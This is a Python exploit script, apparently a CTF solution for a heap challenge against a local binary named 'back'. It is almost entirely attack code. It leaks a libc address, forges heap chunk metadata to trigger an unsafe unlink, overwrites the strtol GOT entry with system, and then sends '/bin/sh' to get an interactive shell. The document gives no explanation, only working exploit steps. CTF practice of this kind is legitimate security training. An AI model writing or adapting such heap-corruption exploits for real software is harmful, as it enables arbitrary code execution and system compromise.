#!/usr/bin/env python2.7
# -*- coding:utf-8 -*-
from mkpwn import *

# settings
local   = True
debug   = False

if local:
    target  = './back'
else:
    target  = ('0', 0)

# get io
io  = mk(target, debug)

# global
got_strtol      = 0x602048
offset_puts     = 0x000000000006fe30
offset_system   = 0x0000000000046640

# leak
def leak_libc():
    io.ru('0x')
    libc_puts   = int(io.r(12), 16)
    libc_base   = libc_puts - offset_puts

    info_found('libc puts', libc_puts)
    info_found('libc base', libc_base)
    info_found('libc system', libc_base + offset_system)
    return libc_base

# exp
def exp():
    libc_base = leak_libc()
    # malloc chunk 0, 1
    io.pr(1, 1, 1)

    fake0  = 'A' * 0x58
    fake0 += l64(0xa1)
    io.pr(2, 0)
    io.w(fake0)

    fake1  = 'A' * 0x60
    fake1 += l64(0x0)
    fake1 += l64(0x31)
    fake1 += l64(0x6020a0 - 0x8 * 3)
    fake1 += l64(0x6020a0 - 0x8 * 2)
    io.pr(2, 1)
    io.w(fake1)

    fake2  = l64(0x30)
    fake2 += l64(0x50)
    io.pr(2, 2)
    io.w(fake2)

    # unlink
    io.pr(3, 1)

    io.pr(4919)
    io.ru('hack this...')
    io.w(l64(got_strtol - 0x18))

    io.pr(4919)
    io.ru('hack this...')
    io.w(l64(libc_base + offset_system))

    io.ru('choice')
    io.pr('/bin/sh')

    info_shell()
    io.interact()

# main
if __name__ == '__main__':
    exp()
